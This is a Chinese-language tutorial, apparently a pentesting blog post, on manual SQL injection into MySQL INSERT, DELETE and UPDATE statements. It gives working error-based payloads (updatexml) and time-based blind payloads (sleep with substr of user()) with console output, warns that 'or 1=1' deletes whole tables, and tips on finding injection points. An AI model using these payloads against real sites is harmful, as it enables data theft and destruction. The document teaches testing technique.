# 0x00 简介

insert,delete,update 主要是用到盲注和报错注入,此类注入点不建议使用sqlmap等工具,会造成大量垃圾数据，和其他情况。



# 0x01 insert,delete,update


#### insert

可以看到假如没闭合是会产生很多垃圾数据的，所以这类注入建议手工或者自己写工具。

一般这种注入会出现在 注册、ip头、留言板等等需要写入数据的地方,同时这种注入不报错一般较难发现。

1. 报错

```
mysql> insert into admin (id,username,password) values (2,"or updatexml(1,concat(0x7e,(version())),0) or","admin");
Query OK, 1 row affected (0.00 sec)

mysql> select * from admin;
+------+-----------------------------------------------+----------+
| id   | username                                      | password |
+------+-----------------------------------------------+----------+
|    1 | admin                                         | admin    |
|    1 | and 1=1                                       | admin    |
|    2 | or updatexml(1,concat(0x7e,(version())),0) or | admin    |
+------+-----------------------------------------------+----------+
3 rows in set (0.00 sec)

mysql> insert into admin (id,username,password) values (2,""or updatexml(1,concat(0x7e,(version())),0) or"","admin");
ERROR 1105 (HY000): XPATH syntax error: '~5.5.53'

```

2. 盲注

int型 可以使用 运算符 比如 加减乘除 and or 异或 移位等等

```
mysql> insert into admin values (2+if((substr((select user()),1,1)='r'),sleep(5),1),'1',"admin");
Query OK, 1 row affected (5.00 sec)

mysql> insert into admin values (2+if((substr((select user()),1,1)='p'),sleep(5),1),'1',"admin");
Query OK, 1 row affected (0.00 sec)

```

字符型注意闭合不能使用and

```
mysql> insert into admin values (2,''+if((substr((select user()),1,1)='p'),sleep(5),1)+'',"admin");
Query OK, 1 row affected (0.00 sec)

mysql> insert into admin values (2,''+if((substr((select user()),1,1)='r'),sleep(5),1)+'',"admin");
Query OK, 1 row affected (5.01 sec)

```


注意盲注产生大量垃圾数据。


#### delete

报错注入同上

值得注意的时delete 注入很危险，很危险，很危险。

语句不当 将会亲人泪两行 `or 1=1` 因为 1=1 为true 所以每一行被删除了, 他以前用sqlmap一把梭 现在过的很好，每顿都有人送饭到手上。

所以在 delete注入时使用 or 一定要为false

```
mysql> delete from admin where id =3 or 1=1;
Query OK, 4 rows affected (0.00 sec)

```

报错注入

```
mysql> delete from admin where id =-2 or updatexml(1,concat(0x7e,(version())),0);
ERROR 1105 (HY000): XPATH syntax error: '~5.5.53'



```

盲注

or 配上 `if()` 函数使用不当 再提下 if(expr1,expr2,expr3)，如果expr1的值为true，返回expr2的值，如果expr1的值为false，
返回expr3的值。

```
mysql> delete from admin where id =-2 or if((substr((select user()),1,1)='r4'),sleep(5),1);
Query OK, 3 rows affected (0.00 sec)

```

所以 delete中 or 的正确使用方法 (or 右边要为false)

```
mysql> delete from admin where id =-2 or if((substr((select user()),1,1)='r4'),sleep(5),0);
Query OK, 0 rows affected (0.00 sec)

mysql> delete from admin where id =-2 or if((substr((select user()),1,1)='r'),sleep(5),0);
Query OK, 0 rows affected (5.00 sec)

```


#### update

与上面的类似

```
mysql> select * from admin;
+------+----------+----------+
| id   | username | password |
+------+----------+----------+
|    2 | 1        | admin    |
|    2 | 1        | admin    |
|    2 | 1        | admin    |
|    2 | admin    | admin    |
+------+----------+----------+
4 rows in set (0.00 sec)

mysql> update admin set id="5"+sleep(5)+"" where id=2;
Query OK, 4 rows affected (20.00 sec)
Rows matched: 4  Changed: 4  Warnings: 0
```


# 0x02 文末

update，insert注入怎么找，我们可以尝试性插入、引号、双引号、转义符\ 让语句不能正常执行，然后如果插入失败，更新失败，然后深入测试确定是否存在注入


#### 本文如有错误，请及时提醒，避免误导他人 

* author：404